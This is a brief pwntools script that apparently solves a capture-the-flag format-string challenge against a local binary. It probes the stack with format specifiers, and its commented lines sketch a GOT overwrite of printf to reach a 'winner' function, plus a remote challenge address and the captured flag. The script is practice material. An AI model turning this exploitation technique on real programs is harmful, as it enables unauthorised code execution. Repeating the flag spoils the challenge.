from formatStringExploiter.FormatString import FormatString
from pwn import *
context.log_level='debug'
# winner = 0x4008DA

#payload = 'AAAA.1.%1$#x.2.%2$#x.3.%3$#x.4.%4$#x.5.%5$#x.6.%6$#x.7.%7$#x.8.%8$#x.'


# p=remote("220.249.52.133","42898")

elf=ELF("./format")
def exec_fmt(s):
    p=process("./format")
    p.sendlineafter("Give me some text.\n",s)
    sleep(0.1)
    ret = p.recvuntil("\n",drop=True)
    ret =ret[10:]
    # ret = p.recvuntil("You typed ",drop=True)
    # p.recvuntil("!\n")
    # p.recvuntil("Nope, try again\n")
    # p.close()
    # print(s)
    return ret


# Load the binary in pwntools. This way we don't need to worry about the
# details, just pass it to FormatString
fmtStr = FormatString(exec_fmt,elf=elf)
print(fmtStr)
# exec_fmt("aaaaaoo")
# payload=fsmtStr = FormatString(exec_fmt,elf=elf,index=6,pad=0,explore_stack=False)
# fsmtStr.write_q(elf.symbols['got.printf'], str(winner))
# print(payload.write_q(elf.symbols['got.printf'], winner))
# p.sendline("2")
# p.interactive()
# cyberpeace{5edf2b804cb625b46ed72702d16b006f}
